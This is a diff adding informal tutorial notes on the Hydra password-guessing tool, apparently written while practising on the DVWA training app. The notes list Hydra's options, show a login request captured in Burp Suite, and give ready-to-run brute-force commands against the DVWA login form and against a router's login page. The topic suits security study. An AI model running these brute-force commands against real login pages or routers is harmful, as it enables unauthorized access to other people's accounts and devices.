@@ -1,0 +1,27 @@
+1) to get help
+    :::in terminal:::
+           hydra
+
+2) options in hydra:::::
+     -L            //file or dictionary for username
+     -l            //single username
+     -p            // single password
+     -P            //password list
+     -C            //file format of both username and password login:pass
+
+3)open burpsuite and make changes in browser settings::::
+     NOW make false login in the page::::
+      in burpsuite you will see this data:::::
+               POST /DVWA-1.0.8/login.php HTTP/1.1
+               HOST 192.168.1.102                                      //ip of login page of website
+               username=anything&password=anything&Login=login
+
+:::in terminal:::
+        to start attack::::
+          hydra -l admin -P passlist 192.168.1.102 http-post-form "/DVWA-1.0.8/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V       //LOGIN FAILED is the msg that appears at fake login
+
+
+
+4) hydra useage at router::::
+       :::in terminal:::
+              hydra http://[192.168.0.1]/login.html -e ns -F -V -L Desktop/top10.txt -P Desktop/top10.txt                  //ip and web page name                   
